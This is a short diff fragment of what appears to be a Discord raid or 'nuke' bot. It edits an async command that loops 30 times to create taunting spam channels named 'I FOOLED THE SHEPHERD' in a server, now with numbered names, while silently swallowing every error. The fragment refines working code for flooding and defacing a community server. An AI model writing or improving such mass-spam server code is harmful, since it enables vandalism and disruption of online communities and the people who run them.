@@ -668,9 +668,9 @@ async def enhanced(ctx):
         except:
             pass
 		
-     for i in range(30):
+    for i in range(30):
         try:
-            await ctx.guild.create_text_channel('I FOOLED THE SHEPHERD')
+            await ctx.guild.create_text_channel(f"I FOOLED THE SHEPHERD-{i}")
         except:
             pass
 
